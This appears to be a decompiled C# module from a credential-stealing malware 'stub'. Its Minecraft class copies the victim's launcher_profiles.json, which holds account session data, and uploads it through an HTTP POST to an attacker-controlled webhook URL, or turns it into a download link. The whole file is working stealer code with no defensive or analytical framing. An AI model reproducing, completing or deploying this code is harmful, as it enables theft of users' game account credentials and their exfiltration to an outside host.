using System;
using System.IO;
using System.Net.Http;

namespace Stub
{
	// Token: 0x02000025 RID: 37
	public static class Minecraft
	{
		// Token: 0x0600006E RID: 110 RVA: 0x00006724 File Offset: 0x00004924
		public static string GetMinecraft()
		{
			string text = Program.tempFolder + "\\.minecraft\\launcher_profiles.json";
			if (File.Exists(text))
			{
				File.Copy(text, Program.tempFolder + "\\launcher_profiles.json");
				string webhookURL = Program.WebhookURL;
				try
				{
					return Functions.CreateDownloadLink(Program.tempFolder + "\\launcher_profiles.json");
				}
				catch
				{
					return Minecraft.SendMinecraft();
				}
			}
			return "No Minecraft Found";
		}

		// Token: 0x0600006F RID: 111 RVA: 0x0000679C File Offset: 0x0000499C
		public static string SendMinecraft()
		{
			string result;
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(Program.tempFolder + "\\launcher_profiles.json");
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "launcher_profiles.json");
					httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
				}
				result = "Sent As File";
			}
			catch
			{
				result = "Error Sending File, Or File Not Found";
			}
			return result;
		}
	}
}
